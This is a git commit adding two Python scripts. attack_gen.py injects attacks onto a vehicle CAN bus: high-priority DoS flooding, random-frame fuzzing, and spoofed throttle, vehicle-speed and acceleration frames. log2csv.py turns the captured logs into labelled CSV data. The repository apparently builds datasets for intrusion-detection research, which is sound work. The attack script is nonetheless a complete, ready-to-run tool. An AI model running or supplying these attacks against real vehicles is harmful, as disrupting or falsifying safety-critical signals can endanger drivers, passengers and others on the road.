19285e28c8aeaab3d404dc995c5ac32feaa329cb
fabiopapais <fabiopapais0@gmail.com>
2024-05-27 21:32:02 -0300

    Initial commit

---
+++ attack_gen.py
@@ -0,0 +1,83 @@
+import time
+import can
+import random
+import sys
+
+bus = can.interface.Bus(interface='socketcan', channel='can0', bitrate=500000)
+
+def send_message(arb_id=0x000, bytes=[0, 0, 0, 0, 0, 0, 0, 0]):
+    """Sends a single message."""
+    with bus:
+        msg = can.Message(
+            arbitration_id=arb_id, data=bytes
+        )
+        try:
+            bus.send(msg)
+            print(f"Message {hex(msg.arbitration_id)} {msg.data.hex()} sent on {bus.channel_info}")
+        except can.CanError:
+            print("Message NOT sent")
+
+def generate_random_bytes():
+    bytes = []
+    for i in range(8):
+        bytes.append(random.randrange(0, 255))
+    return bytes
+
+def dos_attack(interval=0.003, duration=20):
+    """Sends a strem of high-priority message."""
+    print("Starting DoS Attack")
+    for i in range(int(duration / interval)):
+        msg = can.Message(arbitration_id=0x000, data=[0, 0, 0, 0, 0, 0, 0, 0])
+        task = bus.send_periodic(msg, interval)
+        assert isinstance(task, can.CyclicSendTaskABC)
+        time.sleep(interval)
+        task.stop()
+    print("Stopped DoS cyclic send")
+
+def fuzzy_attack(interval=0.003, duration=20):
+    """Sends stream of random id and payload messages."""
+    print("Starting Fuzzy Attack")
+    for i in range(int(duration / interval)):
+        msg = can.Message(arbitration_id=random.randrange(0, 4095), data=generate_random_bytes())
+        task = bus.send_periodic(msg, interval)
+        assert isinstance(task, can.CyclicSendTaskABC)
+        time.sleep(interval)
+        task.stop()
+    print("Stopped Fuzzy attack")
+
+def throt_vehicspeed_spoofing(interval=0.1, duration=20):
+    """Sends falsified throttle and vehicle speed message."""
+    print("Starting Throttle and Vehicle Speed Spoofing")
+    for i in range(int(duration / interval)):
+        msg = can.Message(arbitration_id=0x7E2, data=[00, 65, 00, 00, 00, 00, 00, 00])
+        task = bus.send_periodic(msg, interval)
+        assert isinstance(task, can.CyclicSendTaskABC)
+        time.sleep(interval)
+        task.stop()
+    print("Stopped Throttle and Vehicle Speed Spoofing")
+
+def acelleration_spoofing(interval=0.05, duration=20):
+    """Sends falsified acelleration response message."""
+    print("Starting Acceleration Spoofing")
+    for i in range(int(duration / interval)):
+        msg = can.Message(arbitration_id=0x7E0, data=[00, 65, 00, 00, 00, 00, 00, 00])
+        task = bus.send_periodic(msg, interval)
+        assert isinstance(task, can.CyclicSendTaskABC)
+        time.sleep(interval)
+        task.stop()
+    print("Stopped Acceleration Spoofing")
+
+if __name__ == "__main__":
+    command = sys.argv[1]
+    duration = int(sys.argv[2])
+
+    if (command == "dos"):
+        dos_attack(duration=duration)
+    elif (command == "fuzzy"):
+        fuzzy_attack(duration=duration)
+    elif (command == "throt"):
+        throt_vehicspeed_spoofing(duration=duration)
+    elif (command == "accel"):
+        acelleration_spoofing(duration=duration)
+
+    bus.shutdown()
---
+++ log2csv.py
@@ -0,0 +1,40 @@
+import sys
+import csv
+
+path = sys.argv[1]
+label = sys.argv[2]
+
+with open(path, 'r') as file: log_lines = list(file)
+
+# reads lines and converts data to decimal
+for i, line in enumerate(log_lines):
+    separated_line = line.strip().split()
+    id, payload = separated_line[2].split('#')
+    bytes = [int(payload[i:i+2], 16) for i in range(0, len(payload), 2)]
+    if len(bytes) < 8: # fill blank bytes with -1
+        bytes += [-1] * (8 - len(bytes))
+    # timestamp, id, and 8 bytes of data all converted to decimal
+    log_lines[i] = [float(separated_line[0][1:-1]), int(id, 16)] + bytes
+
+# creates 'time_interval' and 'same_id_time_interval' columns, removing timestamp
+last_timestamps = {}
+for i in range(1, len(log_lines)):
+    if i != 0: # time interval
+        log_lines[i].append(log_lines[i][0] - log_lines[i-1][0])
+        # same id time interval
+        if log_lines[i][1] not in last_timestamps.keys():
+            log_lines[i].append(0)
+            last_timestamps[log_lines[i][1]] = log_lines[i][0]
+        else:
+            log_lines[i].append(log_lines[i][0] - last_timestamps[log_lines[i][1]])
+            last_timestamps[log_lines[i][1]] = log_lines[i][0]
+    log_lines[i] += [label]
+log_lines[0] += [0, 0, label]
+
+log_lines = [line[1:] for line in log_lines]
+
+# writes data in csv file 
+with open(path[:-3] + 'csv', 'w', newline='') as file:
+    writer = csv.writer(file)
+    writer.writerow(['id', 'byte0', 'byte1', 'byte2', 'byte3', 'byte4', 'byte5', 'byte6', 'byte7', 'time_interval', 'same_id_time_interval', 'label'])
+    writer.writerows(log_lines)
